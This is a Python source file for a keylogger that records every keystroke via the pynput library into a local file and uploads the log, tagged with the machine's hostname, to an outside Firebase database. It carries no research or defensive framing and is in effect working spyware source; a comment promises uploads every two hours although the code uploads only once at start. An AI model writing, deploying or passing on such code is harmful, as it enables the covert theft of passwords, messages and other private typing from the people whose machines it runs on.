from pynput.keyboard import Key, Listener
import os
from datetime import datetime
import time
import requests
import socket

firebase_url = 'https://project-runnner-default-rtdb.firebaseio.com/'
log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")
hostname = socket.gethostname()
localtime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

recent_keys = {}
debounce_time = 0.2

def write_to_file(key):
    current_time = time.time()
    key_str = None
    if hasattr(key, 'char') and key.char:
        key_str = key.char
    elif key == Key.space:
        key_str = "\t"
    elif key == Key.enter:
        key_str = "\\n"
    elif key == Key.backspace:
        key_str = "[BS]"
    if key_str and (current_time - recent_keys.get(key_str, 0)) > debounce_time:
        with open(log_file, "a") as file:
            file.write(key_str)
        recent_keys[key_str] = current_time

def upload_log():
    try:
        with open(log_file, 'r') as file:
            file_data = file.read()
    except FileNotFoundError:
        exit()
    data_to_upload = {'runnner': file_data}
    db_path = f'users/{hostname}/{localtime}.json'
    requests.put(firebase_url + db_path, json=data_to_upload)

# Wipe previous data from the log file
with open(log_file, 'w') as file:
    pass

# Log start time
with open(log_file, "a") as file:
    file.write(f"\\n--- Logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\\n")

# Upload log to Firebase after every 2 hours
upload_log()

# Start the listener
def start_listener():
    with Listener(on_press=write_to_file) as listener:
        listener.join()

if __name__ == "__main__":
    start_listener()
